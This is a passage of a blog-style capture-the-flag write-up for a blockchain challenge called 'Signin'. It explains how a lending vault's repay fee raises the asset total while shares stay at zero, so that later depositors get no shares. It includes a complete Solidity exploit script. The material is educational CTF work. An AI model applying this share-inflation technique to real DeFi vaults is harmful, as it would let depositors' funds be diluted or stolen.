+</span></span><span class=line><span class=ln> 8</span><span class=cl>            <span class=n>shares</span> <span class=o>=</span> <span class=p>(</span><span class=n>assets</span> <span class=o>*</span> <span class=n>totalAsset</span><span class=p>.</span><span class=n>shares</span><span class=p>)</span> <span class=o>/</span> <span class=n>totalAsset</span><span class=p>.</span><span class=n>amount</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 9</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln>10</span><span class=cl>    <span class=p>}</span>
+</span></span></code></pre></div><p>The <code>Vault::convertToShares</code> function logic looks correct. It uses a struct named <code>totalAsset</code>, which is an instance of <code>VaultAccount</code>. This struct has two members: <code>amount</code> and <code>shares</code>.</p><ul><li><code>amount</code> represents the total assets deposited into the vault.</li><li><code>shares</code> is the total number of shares minted for those assets.
+Since the contract uses this struct to track deposits, we <strong>cannot manipulate the vault through direct donations</strong>.According to the formula, depositing 999 ether will result in <strong>less than 500 shares</strong> only if:</li><li><code>totalAsset.amount > 0</code> and <code>totalAsset.amount > 999 ether</code>, or</li><li><code>totalAsset.amount > 0</code> and <code>totalAsset.shares == 0</code>.</li></ul><p>However, we can’t make <code>totalAsset.amount > 999 ether</code> because we only have <code>1e18 LING</code> tokens available. So, our only option is to make <code>totalAsset.shares == 0</code>. But this won’t happen just by depositing and redeeming shares — because that always updates both amount and shares. For this to work, there must be some function in the contract that increases <code>totalAsset.amount</code> without updating <code>totalAsset.shares</code> — meaning it calculates the amount incorrectly.</p><p>If we look closely, we can see that the Vault also supports lending, and when someone borrows, they have to pay a fee. The following functions are related to the lending logic:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln> 1</span><span class=cl>    <span class=kd>function</span> <span class=nf>borrowAssets</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>amount</span><span class=p>)</span> <span class=k>external</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 2</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>amount</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 3</span><span class=cl>            <span class=nb>revert</span><span class=p>(</span><span class=s>&#34;zero amount&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=ln> 4</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln> 5</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>amount</span> <span class=o>&gt;</span> <span class=n>totalAssets</span><span class=p>())</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 6</span><span class=cl>            <span class=nb>revert</span><span class=p>(</span><span class=s>&#34;insufficient balance&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=ln> 7</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln> 8</span><span class=cl>        <span class=n>borrowedAssets</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>+=</span> <span class=n>amount</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 9</span><span class=cl>        <span class=n>totalBorrowedAssets</span> <span class=o>+=</span> <span class=n>amount</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>10</span><span class=cl>        <span class=n>ling</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=n>amount</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>11</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln>12</span><span class=cl>
+</span></span><span class=line><span class=ln>13</span><span class=cl>    <span class=kd>function</span> <span class=nf>repayAssets</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>amount</span><span class=p>)</span> <span class=k>external</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>14</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>amount</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>15</span><span class=cl>            <span class=nb>revert</span><span class=p>(</span><span class=s>&#34;zero amount&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>16</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln>17</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>borrowedAssets</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>&lt;</span> <span class=n>amount</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>18</span><span class=cl>            <span class=nb>revert</span><span class=p>(</span><span class=s>&#34;invalid amount&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>19</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln>20</span><span class=cl>        <span class=kt>uint256</span> <span class=n>fee</span> <span class=o>=</span> <span class=p>(</span><span class=n>amount</span> <span class=o>*</span> <span class=mi>1</span><span class=p>)</span> <span class=o>/</span> <span class=mi>100</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>21</span><span class=cl>        <span class=n>borrowedAssets</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>-=</span> <span class=n>amount</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>22</span><span class=cl>        <span class=n>totalBorrowedAssets</span> <span class=o>-=</span> <span class=n>amount</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>23</span><span class=cl>        <span class=n>totalAsset</span><span class=p>.</span><span class=n>amount</span> <span class=o>+=</span> <span class=n>fee</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>24</span><span class=cl>        <span class=n>ling</span><span class=p>.</span><span class=n>transferFrom</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span> <span class=n>amount</span> <span class=o>+</span> <span class=n>fee</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>25</span><span class=cl>    <span class=p>}</span>
+</span></span></code></pre></div><p>Our goal is to update only the <code>totalAsset.amount</code> without changing <code>totalAsset.shares</code>, and the <code>Vault::repayAssets</code> function allows us to do exactly that. When someone borrows and repays their debt, they pay an extra 1% fee, which is added directly to <code>totalAsset.amount</code>.</p><p>To exploit this, we start by depositing a small amount, like 1000 wei LING, then borrow 1000 wei LING, and redeem our 1000 shares to get back the 1000 tokens. This action reduces totalAsset.shares to zero. Next, when we repay the borrowed 1000 LING plus the 1% fee (totaling 1010 wei), the <code>totalAsset.amount</code> increases to 1010 while <code>totalAsset.shares</code> stays at zero.</p><p>Now, when someone calls <code>Vault::deposit</code>, the shares they receive are calculated as <code>(assets * totalAsset.shares) / totalAsset.amount</code>. Since <code>totalAsset.shares</code> is zero, the result is zero shares. So, when the <code>Setup</code> contract deposits 999e18 LING, it receives zero shares, which is less than 500 ether, and the <code>solved</code> flag is set to true.</p><p>However, there is a catch. We only deposited 1000 wei LING, but we are trying to withdraw 2000 wei LING — 1000 by borrowing and 1000 by redeeming shares. Borrowing works fine, but when redeeming, the vault won’t have enough tokens to transfer back, causing an error. To fix this, we need to donate some LING tokens directly to the vault contract to ensure it has enough balance for redemption.</p><p>The below is the exploit script:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln> 1</span><span class=cl><span class=c1>//SPDX-License-Identifier:MIT
+</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>20</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 3</span><span class=cl>
+</span></span><span class=line><span class=ln> 4</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>Script</span><span class=p>,</span> <span class=n>console</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;forge-std/Script.sol&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 5</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>Setup</span><span class=p>,</span><span class=n>Vault</span><span class=p>,</span><span class=n>LING</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;src/signin/Setup.sol&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 6</span><span class=cl>
+</span></span><span class=line><span class=ln> 7</span><span class=cl><span class=kd>contract</span> <span class=nc>Solve</span> <span class=k>is</span> <span class=n>Script</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 8</span><span class=cl>    <span class=kd>function</span> <span class=nf>run</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 9</span><span class=cl>        <span class=n>vm</span><span class=p>.</span><span class=n>startBroadcast</span><span class=p>();</span>
+</span></span><span class=line><span class=ln>10</span><span class=cl>        <span class=n>Setup</span> <span class=n>setup</span> <span class=o>=</span> <span class=n>Setup</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=mh>0xdd154d7ff043F9DDb8029D888208fE780cC8D9b1</span><span class=p>));</span>
+</span></span><span class=line><span class=ln>11</span><span class=cl>        <span class=n>Vault</span> <span class=n>vault</span><span class=o>=</span><span class=n>setup</span><span class=p>.</span><span class=n>vault</span><span class=p>();</span>
+</span></span><span class=line><span class=ln>12</span><span class=cl>        <span class=n>LING</span> <span class=n>ling</span><span class=o>=</span><span class=n>setup</span><span class=p>.</span><span class=n>ling</span><span class=p>();</span>
+</span></span><span class=line><span class=ln>13</span><span class=cl>        <span class=n>setup</span><span class=p>.</span><span class=n>claim</span><span class=p>();</span>
+</span></span><span class=line><span class=ln>14</span><span class=cl>        <span class=n>ling</span><span class=p>.</span><span class=n>approve</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>vault</span><span class=p>),</span><span class=mi>1000</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>15</span><span class=cl>        <span class=n>vault</span><span class=p>.</span><span class=n>deposit</span><span class=p>(</span><span class=mi>1000</span><span class=p>,</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>16</span><span class=cl>        <span class=n>vault</span><span class=p>.</span><span class=n>borrowAssets</span><span class=p>(</span><span class=mi>1000</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>17</span><span class=cl>        <span class=n>ling</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>vault</span><span class=p>),</span><span class=mi>1000</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>18</span><span class=cl>        <span class=n>vault</span><span class=p>.</span><span class=n>redeem</span><span class=p>(</span><span class=mi>1000</span><span class=p>,</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>19</span><span class=cl>        <span class=n>ling</span><span class=p>.</span><span class=n>approve</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>vault</span><span class=p>),</span><span class=mi>1010</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>20</span><span class=cl>        <span class=n>vault</span><span class=p>.</span><span class=n>repayAssets</span><span class=p>(</span><span class=mi>1000</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>21</span><span class=cl>        <span class=n>setup</span><span class=p>.</span><span class=n>solve</span><span class=p>();</span>
+</span></span><span class=line><span class=ln>22</span><span class=cl>        <span class=n>console</span><span class=p>.</span><span class=n>log</span><span class=p>(</span><span class=n>setup</span><span class=p>.</span><span class=n>isSolved</span><span class=p>());</span>
+</span></span><span class=line><span class=ln>23</span><span class=cl>        <span class=n>vm</span><span class=p>.</span><span class=n>stopBroadcast</span><span class=p>();</span>
+</span></span><span class=line><span class=ln>24</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln>25</span><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><h3 id=note data-numberify>Note<a class="anchor ms-1" href=#note></a></h3><p>If you want to try this challenge locally, clone the <a href=https://github.com/s4bot3ur/Blockchain-Challenges target=_blank rel="noopener noreferrer">challenges repository<i class="fas fa-external-link-square-alt ms-1"></i></a> and follow the <a href=https://github.com/s4bot3ur/Blockchain-Challenges/tree/main/EVM/2025 target=_blank rel="noopener noreferrer">setup guide<i class="fas fa-external-link-square-alt ms-1"></i></a>. This setup is available only for 2025 challenge solutions. If you face any issues feel free to reach out on <a href=https://discord.com/users/666925625650446357 target=_blank rel="noopener noreferrer">discord<i class="fas fa-external-link-square-alt ms-1"></i></a> :)</p><p style=text-align:center>***<strong>Hope you enjoyed this write-up. Keep on hacking and learning!</strong>***</p></div></div></div><div class=card-footer><div class="post-navs d-flex justify-content-evenly"><div class="post-nav post-prev"><i class="fas fa-fw fa-chevron-down post-prev-icon me-1" data-fa-transform=rotate-90></i>
+<a href=/blogs/war-games-ctf/bank-vault/>Bank Vault</a></div></div></div></article><div class="card component row post-comments" id=post-comments><div class=card-header><h2 class="card-title my-2 fs-4 text-surface">Comments</h2></div><div class=card-body><div class=giscus></div></div></div></div></div><aside class="col-xxl-4 sidebar d-flex"><div class="container d-flex flex-column"><div class="accordion profile"><div class="accordion-item card row text-center component"><div class="accordion-header card-header border-0" id=profile-header><a class="accordion-button d-lg-none mb-2 shadow-none p-0 bg-transparent text-surface" role=button data-bs-toggle=collapse href=#profile aria-expanded=true aria-controls=profile>Profile</a></div><div class="card-body collapse accordion-collapse accordion-body d-lg-block show" id=profile aria-labelledby=profile-header><div class="col-12 d-flex align-items-center justify-content-center"><picture><source srcset=https://s4bot3ur.github.io/images/avatar.webp type=image/webp><img class="profile-avatar rounded-circle" alt="Komal Rao" src loading=lazy data-viewer-invisible></picture></div><div class="col-12 profile-meta"><div class="profile-name fw-fold fs-lg">Komal Rao</div><div class=profile-bio>Web3 Security Researcher</div><div class=profile-company><i class="fas fa-fw fa-building"></i>Team Bi0s</div><div class=profile-location><i class="fas fa-fw fa-map-marker-alt"></i>Bharat</div></div><nav class="social-links nav justify-content-center mt-1 justify-content-around"><a class="nav-link social-link" target=_blank href=https://github.com/s4bot3ur title=GitHub rel=me><i class="fa-fw fa-2x fab fa-github"></i>
+</a><a class="nav-link social-link" target=_blank href=https://linkedin.com/in/dheekonda-komal-rao-6bb68727b title=LinkedIn rel=me><i class="fa-fw fa-2x fab fa-linkedin-in" style=color:#0a66c2></i>
+</a><a class="nav-link social-link" target=_blank href=https://medium.com/@s4bot3ur title=Medium rel=me><i class="fa-fw fa-2x fab fa-medium-m"></i>
+</a><a class="nav-link social-link" target=_blank href=/authors/index.xml title=RSS rel=me><i class="fas fa-fw fa-2x fa-rss" style=color:#ea6221></i></a></nav></div></div></div><div class="accordion taxonomies-toggle"><div class="row card component accordion-item"><div class="accordion-header card-header border-0"><a class="accordion-button d-lg-none mb-1 shadow-none p-0 bg-transparent" role=button data-bs-toggle=collapse href=#taxonomies-toggle aria-expanded=true aria-controls=taxonomies-toggle>Taxonomies</a></div><div class="card-body collapse accordion-collapse accordion-body d-lg-block show" id=taxonomies-toggle><ul class="nav nav-pills nav-fill" role=tablist><li class=nav-item role=presentation><button class="nav-link active" id=taxonomyCategoriesTab data-bs-toggle=tab data-bs-target=#taxonomyCategories type=button role=tab aria-controls=taxonomyCategories aria-selected=true>
+Categories</button></li><li class=nav-item role=presentation><button class=nav-link id=taxonomyTagsTab data-bs-toggle=tab data-bs-target=#taxonomyTags type=button role=tab aria-controls=taxonomyTags aria-selected=true>
+Tags</button></li><li class=nav-item role=presentation><button class=nav-link id=taxonomySeriesTab data-bs-toggle=tab data-bs-target=#taxonomySeries type=button role=tab aria-controls=taxonomySeries aria-selected=true>
+Series</button></li><li class=nav-item role=presentation><button class=nav-link id=taxonomyArchivesTab data-bs-toggle=tab data-bs-target=#taxonomyArchives type=button role=tab aria-controls=taxonomyArchives aria-selected=true>
+Archives</button></li></ul><div class="tab-content mt-3"><div class="tab-pane active" id=taxonomyCategories role=tabpanel aria-labelledby=taxonomyCategoriesTab tabindex=0><a href=/categories/blockchain/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-category me-2 mb-2" title=Blockchain>Blockchain</a></div><div class=tab-pane id=taxonomyTags role=tabpanel aria-labelledby=taxonomyTagsTab tabindex=0><a href=/tags/erc20/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title=ERC20>ERC20
+</a><a href=/tags/access-control/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Access Control">Access Control
+</a><a href=/tags/delegate-call/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Delegate Call">Delegate Call
+</a><a href=/tags/storage-layout/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Storage Layout">Storage Layout
+</a><a href=/tags/control-flow-manipulation/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Control Flow Manipulation">Control Flow Manipulation
+</a><a href=/tags/msg.sender-vs-tx.origin/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Msg.sender vs Tx.origin">Msg.sender vs Tx.origin
+</a><a href=/tags/assembly/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title=Assembly>Assembly
+</a><a href=/tags/calldata-manipulation/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Calldata Manipulation">Calldata Manipulation
+</a><a href=/tags/decentralized-exchange/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Decentralized Exchange">Decentralized Exchange
+</a><a href=/tags/denial-of-service/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Denial of Service">Denial of Service
+</a><a href=https://s4bot3ur.github.io/tags class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title=ALL>ALL
+<span class="badge badge-sm text-secondary bg-white ms-1">25</span></a></div><div class=tab-pane id=taxonomySeries role=tabpanel aria-labelledby=taxonomySeriesTab tabindex=0><a href=/series/ethernaut/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-series me-2 mb-2" title=Ethernaut>Ethernaut
+</a><a href=/series/tcp1p-2024/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-series me-2 mb-2" title=TCP1P-2024>TCP1P-2024
+</a><a href=/series/war-games-ctf/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-series me-2 mb-2" title=War-Games-CTF>War-Games-CTF
+</a><a href=/series/damn-vulnerable-defi/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-series me-2 mb-2" title=Damn-Vulnerable-Defi>Damn-Vulnerable-Defi
+</a><a href=/series/r3-ctf-2025/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-series me-2 mb-2" title=R3-CTF-2025>R3-CTF-2025</a></div><div class=tab-pane id=taxonomyArchives role=tabpanel aria-labelledby=taxonomyArchivesTab tabindex=0><a href class="btn btn-sm btn-secondary post-taxonomy ps-3 me-2 mb-2" title=2025>2025 <span class="badge badge-sm text-secondary bg-white ms-1">1</span>
+</a><a href class="btn btn-sm btn-secondary post-taxonomy ps-3 me-2 mb-2" title=2024>2024 <span class="badge badge-sm text-secondary bg-white ms-1">40</span></a></div></div></div></div></div><div class="accordion posts-toggle"><div class="row card component accordion-item"><div class="accordion-header card-header border-0"><a class="accordion-button d-lg-none mb-1 shadow-none p-0 bg-transparent" role=button data-bs-toggle=collapse href=#posts-toggle aria-expanded=true aria-controls=posts-toggle>Posts</a></div><div class="card-body collapse accordion-collapse accordion-body d-lg-block show" id=posts-toggle><ul class="nav nav-pills nav-fill" role=tablist><li class=nav-item role=presentation><button class="nav-link active" id=recent-posts-tab data-bs-toggle=tab data-bs-target=#recent-posts type=button role=tab aria-controls=recent-posts aria-selected=true>
+Recent Posts</button></li></ul><div class="tab-content mt-3"><div class="tab-pane active" id=recent-posts role=tabpanel aria-labelledby=recent-posts-tab tabindex=0><ul class="post-list list-unstyled ms-1"><li class=mb-2><div class=d-flex><div class="flex-grow-1 d-flex flex-column h-auto justify-content-center"><a class=post-title href=/blogs/r3-ctf-2025/signin/>Signin</a><div class="post-meta mt-2"><span class=post-date>July 16, 2025</span></div></div></div></li><li class=mb-2><div class=d-flex><div class="flex-grow-1 d-flex flex-column h-auto justify-content-center"><a class=post-title href=/blogs/war-games-ctf/bank-vault/>Bank Vault</a><div class="post-meta mt-2"><span class=post-date>December 30, 2024</span></div></div></div></li><li class=mb-2><div class=d-flex><div class="flex-grow-1 d-flex flex-column h-auto justify-content-center"><a class=post-title href=/blogs/war-games-ctf/death-star/>Death Star</a><div class="post-meta mt-2"><span class=post-date>December 30, 2024</span></div></div></div></li><li class=mb-2><div class=d-flex><div class="flex-grow-1 d-flex flex-column h-auto justify-content-center"><a class=post-title href=/blogs/war-games-ctf/guess-it/>Guess It</a><div class="post-meta mt-2"><span class=post-date>December 30, 2024</span></div></div></div></li><li class=mb-2><div class=d-flex><div class="flex-grow-1 d-flex flex-column h-auto justify-content-center"><a class=post-title href=/blogs/war-games-ctf/dungeons-and-naga/>Dungeons and Naga</a><div class="post-meta mt-2"><span class=post-date>December 30, 2024</span></div></div></div></li></ul></div></div></div></div></div><div class="accordion post-toc d-none d-lg-block"><div class="accordion-item row mb-4 card component" id=postTOC><div class="card-header accordion-header"><h2 class="card-title fs-4 my-2 text-surface d-none d-lg-block">Contents</h2><a class="accordion-button d-lg-none mb-1 collapsed shadow-none p-0 bg-transparent" role=button data-bs-toggle=collapse href=#post-toc aria-expanded=false aria-controls=post-toc>Contents</a></div><div class="card-body collapse accordion-collapse accordion-body d-lg-block" id=post-toc><nav id=TableOfContents><ul><li><ul><li><a href=#challenge-description>Challenge Description</a></li><li><a href=#the-challenge>The Challenge</a></li><li><a href=#the-exploit>The Exploit</a></li><li><a href=#note>Note</a></li></ul></li></ul></nav></div></div></div></div></aside></div></main><footer class="footer mt-auto py-3 text-center container"><div class="offcanvas offcanvas-bottom h-auto" tabindex=-1 id=offcanvasActionsPanel aria-labelledby=offcanvasActionsPanelLabel><div class=offcanvas-header><div class="offcanvas-title h5" id=offcanvasActionsPanelLabel><i class="fas fa-fw fa-th-large me-1"></i>
+Actions</div><button type=button class="btn-close ms-auto" data-bs-dismiss=offcanvas data-bs-target=offcanvasActionsPanel aria-label=Close></button></div><div class="offcanvas-body mt-2"><div class="actions d-flex overflow-auto align-items-center"><a role=button class="action action-go-back d-flex flex-column align-items-center me-3" href="javascript: window.history.back();"><span class="action-icon mb-2"><i class="fas fa-2x fa-chevron-circle-down" data-fa-transform=rotate-90></i></span> Go back
+</a><a role=button class="action action-reload-page d-flex flex-column align-items-center me-3"><span class="action-icon mb-2"><i class="fas fa-2x fa-redo-alt"></i></span> Reload
+</a><a role=button class="action action-copy-url d-flex flex-column align-items-center me-3"><span class="action-icon mb-2"><i class="fas fa-2x fa-link"></i></span> Copy URL</a></div></div></div><div class="row text-center"><div class="col-12 mt-2"><p class=mb-2>S4b03ur's Website</p><p class="text-secondary mb-2"><small></small></p><div class="copyright mb-2 text-secondary"><small>Copyright © 2024-2025 s4bot3ur. All Rights Reserved.</small></div><nav class="social-links nav justify-content-center mb-2 mt-3"><a class="nav-link social-link p-0 me-1 mb-2" href=mailto:s4bot3ur.x.t0r4n4d0@gmail.com title=Email><i class="fas fa-fw fa-2x fa-envelope" style=color:#0963ac></i>
+</a><a class="nav-link social-link p-0 me-1 mb-2" target=_blank href=https://github.com/s4bot3ur title=GitHub rel=me><i class="fa-fw fa-2x fab fa-github"></i>
+</a><a class="nav-link social-link p-0 me-1 mb-2" target=_blank href=https://twitter.com/s4bot3ur title=Twitter rel=me><i class="fa-fw fa-2x fab fa-twitter" style=color:#1d9bf0></i>
+</a><a class="nav-link social-link p-0 me-1 mb-2" target=_blank href=/index.xml title=RSS rel=me><i class="fas fa-fw fa-2x fa-rss" style=color:#ea6221></i></a></nav></div><div class="col-12 col-lg-8 offset-0 offset-lg-1"></div></div></footer><script data-precache src=/assets/main/bundle.min.c8143ded9867b7480981d8377cdbc1f332a8eebe6a1f319351f966f94a4833da.js integrity="sha256-yBQ97Zhnt0gJgdg3fNvB8zKo7r5qHzGTUflm+UpIM9o=" crossorigin=anonymous async></script><script data-precache src=/assets/icons/bundle.min.f72634cee69eabf9716c1b6c273ad4157e7fade4f44c9cb1a86276f2f0aa5028.js integrity="sha256-9yY0zuaeq/lxbBtsJzrUFX5/reT0TJyxqGJ28vCqUCg=" crossorigin=anonymous defer></script><script data-precache src=/assets/viewer/bundle.min.06371891cfe6d10d36cba465c61c4d7cb17591a3be2fd9af4a38444d2074e709.js integrity="sha256-BjcYkc/m0Q02y6RlxhxNfLF1kaO+L9mvSjhETSB05wk=" crossorigin=anonymous defer></script><script src=https://giscus.app/client.js data-repo=s4bot3ur/Blockchain-Challenges data-repo-id=R_kgDOMw_Cqw data-category=General data-category-id=DIC_kwDOMw_Cq84Ci9GY data-mapping=title data-reactions-enabled=1 data-emit-metadata=1 data-input-position=top data-theme=preferred_color_scheme data-lang=en data-loading=lazy crossorigin=anonymous defer></script></body><script>document.addEventListener("DOMContentLoaded",()=>{document.querySelectorAll("pre").forEach(e=>{const t=document.createElement("button");t.innerText="Copy",t.classList.add("copy-button"),e.appendChild(t),t.addEventListener("click",()=>{const n=e.querySelector("code").innerText;navigator.clipboard.writeText(n).then(()=>{t.innerText="Copied!",setTimeout(()=>{t.innerText="Copy"},2e3)})})})})</script></html>
